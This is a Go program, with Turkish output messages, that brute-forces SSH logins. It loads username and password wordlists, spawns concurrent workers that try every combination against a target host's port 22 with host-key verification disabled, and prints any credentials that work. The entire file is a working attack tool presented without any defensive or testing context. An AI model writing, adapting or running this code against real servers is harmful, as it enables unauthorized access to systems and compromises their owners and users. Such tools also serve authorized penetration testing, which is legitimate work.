package main

import (
    "bufio"
    "fmt"
    "golang.org/x/crypto/ssh"
    "os"
    "sync"
    "time"
)

type Job struct {
    host     string
    username string
    password string
}

type Config struct {
    host      string
    usernames []string
    passwords []string
    workers   int
}

func loadWordlist(filename string) ([]string, error) {
    file, err := os.Open(filename)
    if err != nil {
        return nil, err
    }
    defer file.Close()

    var lines []string
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        lines = append(lines, scanner.Text())
    }
    return lines, scanner.Err()
}

func trySSHLogin(job Job) bool {
    fmt.Printf("Deneniyor: %s@%s - Şifre: %s\n", job.username, job.host, job.password)
    
    config := &ssh.ClientConfig{
        User: job.username,
        Auth: []ssh.AuthMethod{
            ssh.Password(job.password),
        },
        HostKeyCallback: ssh.InsecureIgnoreHostKey(),
        Timeout:        time.Second * 5,
    }

    client, err := ssh.Dial("tcp", job.host+":22", config)
    if err != nil {
        fmt.Printf("Başarısız: %s@%s - Şifre: %s\n", job.username, job.host, job.password)
        return false
    }
    defer client.Close()

    fmt.Printf("\n[+] BAŞARILI! Kullanıcı: %s, Şifre: %s\n", job.username, job.password)
    return true
}

func worker(id int, jobs <-chan Job, wg *sync.WaitGroup) {
    defer wg.Done()
    fmt.Printf("Worker %d başlatıldı\n", id)
    for job := range jobs {
        if trySSHLogin(job) {
            // Başarılı giriş durumunda programı sonlandırabiliriz
            os.Exit(0)
        }
    }
}

func parseArgs() (*Config, error) {
    if len(os.Args) < 2 {
        return nil, fmt.Errorf("kullanım: %s -h <host> [-u user/-U userlist] [-p pass/-P passlist]", os.Args[0])
    }

    config := &Config{
        workers: 5, // Varsayılan worker sayısı
    }

    args := os.Args[1:]
    for i := 0; i < len(args); i++ {
        switch args[i] {
        case "-h":
            if i+1 >= len(args) {
                return nil, fmt.Errorf("-h parametresi için değer eksik")
            }
            config.host = args[i+1]
            i++
        case "-u":
            if i+1 >= len(args) {
                return nil, fmt.Errorf("-u parametresi için değer eksik")
            }
            config.usernames = append(config.usernames, args[i+1])
            i++
        case "-U":
            if i+1 >= len(args) {
                return nil, fmt.Errorf("-U parametresi için dosya adı eksik")
            }
            users, err := loadWordlist(args[i+1])
            if err != nil {
                return nil, fmt.Errorf("kullanıcı listesi yüklenemedi: %v", err)
            }
            config.usernames = users
            i++
        case "-p":
            if i+1 >= len(args) {
                return nil, fmt.Errorf("-p parametresi için değer eksik")
            }
            config.passwords = append(config.passwords, args[i+1])
            i++
        case "-P":
            if i+1 >= len(args) {
                return nil, fmt.Errorf("-P parametresi için dosya adı eksik")
            }
            passes, err := loadWordlist(args[i+1])
            if err != nil {
                return nil, fmt.Errorf("şifre listesi yüklenemedi: %v", err)
            }
            config.passwords = passes
            i++
        }
    }

    if config.host == "" {
        return nil, fmt.Errorf("hedef host (-h) belirtilmedi")
    }
    if len(config.usernames) == 0 {
        return nil, fmt.Errorf("kullanıcı adı (-u veya -U) belirtilmedi")
    }
    if len(config.passwords) == 0 {
        return nil, fmt.Errorf("şifre (-p veya -P) belirtilmedi")
    }

    return config, nil
}

func main() {
    config, err := parseArgs()
    if err != nil {
        fmt.Fprintf(os.Stderr, "Hata: %v\n", err)
        os.Exit(1)
    }

    fmt.Printf("\nBrute Force başlatılıyor...\n")
    fmt.Printf("Hedef: %s\n", config.host)
    fmt.Printf("Kullanıcı sayısı: %d\n", len(config.usernames))
    fmt.Printf("Şifre sayısı: %d\n\n", len(config.passwords))

    jobs := make(chan Job, len(config.usernames)*len(config.passwords))

    // İşleri kuyruğa ekle
    for _, username := range config.usernames {
        for _, password := range config.passwords {
            jobs <- Job{
                host:     config.host,
                username: username,
                password: password,
            }
        }
    }
    close(jobs)

    var wg sync.WaitGroup
    for i := 0; i < config.workers; i++ {
        wg.Add(1)
        go worker(i+1, jobs, &wg)
    }

    wg.Wait()
    fmt.Println("\nTüm denemeler tamamlandı.")
}
